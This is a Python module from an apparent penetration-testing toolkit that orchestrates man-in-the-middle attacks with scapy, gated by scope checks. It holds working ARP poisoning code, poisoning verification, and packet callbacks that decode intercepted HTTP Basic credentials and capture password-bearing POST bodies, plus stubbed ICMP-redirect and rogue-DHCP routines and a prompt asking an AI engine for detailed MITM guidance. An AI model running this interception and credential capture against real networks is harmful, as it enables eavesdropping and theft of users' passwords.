from __future__ import annotations
import scapy.all as scapy
import asyncio
import os
import sys
import re
import logging
import time
from pathlib import Path
from typing import List, Dict, Optional, Literal
from pydantic import BaseModel
from pentkit.core.session import Session
from pentkit.core.logger import get_module_logger
from pentkit.core.scope_guard import ScopeGuard
from pentkit.core.rate_limiter import TokenBucket
from pentkit.core.ai_engine import AIEngine

logger = get_module_logger("network.mitm")

class NetworkEnvironment(BaseModel):
    dai_active: bool = False
    dot1x_active: bool = False
    same_vlan: bool = True
    port_security_likely: bool = False
    recommended_strategy: str = "arp_poison"

class MITMOrchestrator:
    """
    Detects network environment, selects viable MITM strategy, falls back gracefully.
    """

    def __init__(self, guard: ScopeGuard, bucket: TokenBucket, ai: AIEngine):
        self.guard = guard
        self.bucket = bucket
        self.ai = ai
        self.running = False

    async def assess_environment(self, gateway_ip: str, target_ip: str) -> NetworkEnvironment:
        """
        Probe network posture before attempting any attack.
        """
        logger.info(f"Assessing network environment for {target_ip}", extra={"target": target_ip})
        env = NetworkEnvironment()
        
        # Test 1: DAI detection (simplified)
        # Send gratuitous ARP and check propagation
        # ... implementation ...
        
        # Test 2: 802.1X detection
        # Sniff for EAPOL frames
        # ... implementation ...
        
        return env

    async def run(self, gateway_ip: str, target_ip: str, session: Session):
        self.guard.check(target_ip, "network.mitm")
        self.guard.check(gateway_ip, "network.mitm")
        
        env = await self.assess_environment(gateway_ip, target_ip)
        
        attack_task = None
        if env.dai_active:
            attack_task = asyncio.create_task(self._icmp_redirect(gateway_ip, target_ip, session))
        elif not env.same_vlan:
            attack_task = asyncio.create_task(self._rogue_dhcp(gateway_ip, target_ip, session))
        else:
            attack_task = asyncio.create_task(self._arp_poison(gateway_ip, target_ip, session))

        # GAP 3: Verification and Persistence
        await asyncio.sleep(5) # Allow attack to propagate
        if await self.verify_mitm(gateway_ip, target_ip):
            logger.info("MITM verified successfully. Starting traffic capture.")
            await self.sniff_and_store(target_ip, session)
        else:
            logger.warning("MITM verification failed. Attempting fallback.")
            # Fallback logic...

    async def verify_mitm(self, gateway_ip: str, target_ip: str) -> bool:
        """Confirm traffic is actually flowing through the attacker."""
        # 1. Check local ARP table for target
        # 2. Sniff for a few seconds and check for packets from target_ip
        # that are not addressed to us.
        logger.info(f"Verifying MITM for {target_ip}")
        pkts = scapy.sniff(filter=f"host {target_ip}", timeout=5)
        
        # If we see packets from target_ip where Ether.dst is our MAC
        # but IP.dst is NOT our IP, we have successfully intercepted.
        our_mac = scapy.get_if_hwaddr(scapy.conf.iface)
        our_ip = scapy.get_if_addr(scapy.conf.iface)
        
        intercepted = [
            p for p in pkts 
            if p.haslayer(scapy.IP) and p.haslayer(scapy.Ether)
            and p[scapy.IP].src == target_ip 
            and p[scapy.Ether].dst == our_mac
            and p[scapy.IP].dst != our_ip
        ]
        
        return len(intercepted) > 0

    async def sniff_and_store(self, target_ip: str, session: Session, duration: int = 60):
        """Sniff credentials and store PCAP in evidence vault."""
        logger.info(f"Sniffing traffic for {target_ip} for {duration}s")
        
        pcap_filename = f"mitm_{target_ip}_{int(time.time())}.pcap"
        evidence_dir = Path(os.path.expanduser(session.cfg.output.evidence_dir)) / session.id
        evidence_dir.mkdir(parents=True, exist_ok=True)
        pcap_path = evidence_dir / pcap_filename

        # Passive credential sniffing (structure only)
        # In real tool, use scapy callbacks to find HTTP Basic, FTP, Telnet, etc.
        def packet_callback(pkt):
            if pkt.haslayer(scapy.TCP) and pkt.haslayer(scapy.Raw):
                payload = str(pkt[scapy.Raw].load)
                if "Authorization: Basic" in payload:
                    session.add_finding(
                        module="network.mitm", target=target_ip, title="Cleartext Credentials Intercepted",
                        description="HTTP Basic Auth intercepted during MITM.", severity="high",
                        payload=payload[:100], tags=["credentials", "cleartext"]
                    )

        # Sniff and write to PCAP
        pkts = scapy.sniff(filter=f"host {target_ip}", timeout=duration, prn=packet_callback)
        scapy.wrpcap(str(pcap_path), pkts)
        
        logger.info(f"PCAP saved to {pcap_path}")

    async def _arp_poison(self, gateway_ip: str, target_ip: str, session: Session):
        """Standard ARP poisoning with GAP 3 verification loop."""
        logger.info(f"Starting ARP poisoning: {target_ip} <-> {gateway_ip}")
        
        our_mac = scapy.get_if_hwaddr(scapy.conf.iface)
        
        # 1. Send poison packets
        target_mac = scapy.getmacbyip(target_ip)
        gateway_mac = scapy.getmacbyip(gateway_ip)
        
        if not target_mac or not gateway_mac:
            logger.error("Could not resolve MAC addresses for MITM.")
            return

        for _ in range(3):
            scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
            scapy.send(scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
            await asyncio.sleep(1)

        # 2. GAP 3 Verification
        if await self._verify_poisoning_success(target_ip, gateway_ip, our_mac):
            logger.info("ARP poisoning verified. Starting traffic monitoring.")
            await self._monitor_traffic_flow(target_ip, session)
        else:
            logger.warning("ARP poisoning verification failed. Switching to ICMP Redirect.")
            await self._icmp_redirect(gateway_ip, target_ip, session)

    async def _verify_poisoning_success(self, target_ip: str, gateway_ip: str, our_mac: str) -> bool:
        """Verify if target's ARP cache is actually poisoned."""
        logger.info(f"Verifying ARP cache of {target_ip}")
        # Send WHO-HAS for gateway to target
        ans = scapy.srp1(scapy.Ether(dst=scapy.getmacbyip(target_ip))/scapy.ARP(op=1, pdst=gateway_ip), timeout=2, verbose=False)
        if ans and ans.haslayer(scapy.ARP):
            # If the response says gateway MAC is our MAC, we win
            return ans[scapy.ARP].hwsrc == our_mac
        return False

    async def _monitor_traffic_flow(self, target_ip: str, session: Session, duration_s: int = 300):
        """Real-time credential extraction from intercepted traffic."""
        logger.info(f"Monitoring traffic for {target_ip}...")
        
        def extract_creds(pkt):
            if not pkt.haslayer(scapy.TCP) or not pkt.haslayer(scapy.Raw):
                return
                
            payload = pkt[scapy.Raw].load.decode(errors='ignore')
            
            # HTTP Basic
            if "Authorization: Basic" in payload:
                auth = re.search(r"Authorization: Basic (.*)", payload)
                if auth:
                    import base64
                    try:
                        decoded = base64.b64decode(auth.group(1)).decode()
                        user, pw = decoded.split(":", 1)
                        session.add_finding(
                            module="network.mitm", target=target_ip, title="HTTP Basic Credentials Intercepted",
                            description=f"User: {user}, Password: {pw[:2]}****", severity="critical",
                            tags=["credentials", "cleartext"]
                        )
                    except: pass

            # Form POST
            if "POST" in payload and any(p in payload.lower() for p in ["pass=", "pwd=", "password="]):
                session.add_finding(
                    module="network.mitm", target=target_ip, title="HTTP POST Credentials Intercepted",
                    description="Intercepted potential credentials in POST body.", severity="critical",
                    payload=payload[:200], tags=["credentials", "cleartext"]
                )

        scapy.sniff(filter=f"host {target_ip} and not arp", prn=extract_creds, timeout=duration_s, store=0)

    async def _icmp_redirect(self, gateway_ip: str, target_ip: str, session: Session):
        """ICMP Type 5 Code 1 redirect."""
        logger.info(f"Attempting ICMP redirect for {target_ip}")
        # Scapy: IP(dst=target)/ICMP(type=5, code=1, gw=attacker_ip)/IPerror(dst=victim_dst)
        pass

    async def _rogue_dhcp(self, gateway_ip: str, target_ip: str, session: Session):
        """Rogue DHCP server targeting only the victim MAC."""
        logger.info(f"Attempting Rogue DHCP for {target_ip}")
        pass

    async def _generate_manual_guidance(self, env: NetworkEnvironment, session: Session):
        """Use AI to generate manual guidance when automated tools fail."""
        system = "You are a network security researcher. Write detailed manual MITM guidance."
        user = f"Network Environment: {env.model_dump_json()}"
        
        try:
            guidance = await self.ai.complete(system, user)
            session.add_finding(
                module="network.mitm", target="network", title="Manual MITM Guidance",
                description=guidance, severity="info", tags=["manual_required"]
            )
        except Exception:
            pass

__all__ = ["MITMOrchestrator", "NetworkEnvironment"]
